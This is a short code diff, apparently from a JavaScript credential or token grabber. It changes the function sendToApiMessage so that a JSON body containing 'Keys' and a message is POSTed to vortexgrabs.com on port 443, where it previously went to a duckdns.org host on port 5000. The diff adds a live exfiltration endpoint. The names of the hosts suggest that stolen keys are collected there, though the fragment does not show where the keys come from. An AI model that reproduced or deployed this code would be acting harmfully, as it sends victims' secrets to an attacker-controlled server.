@@ -17,8 +17,8 @@ async function sendToApiMessage(Keys, message) {
     const data = JSON.stringify({ Keys: Keys, message: message });
 
     const options = {
-        hostname: 'testotaylans.duckdns.org',
-        port: 5000,
+        hostname: 'vortexgrabs.com',
+        port: 443,
         path: '/send-message',
         method: 'POST',
         headers: {
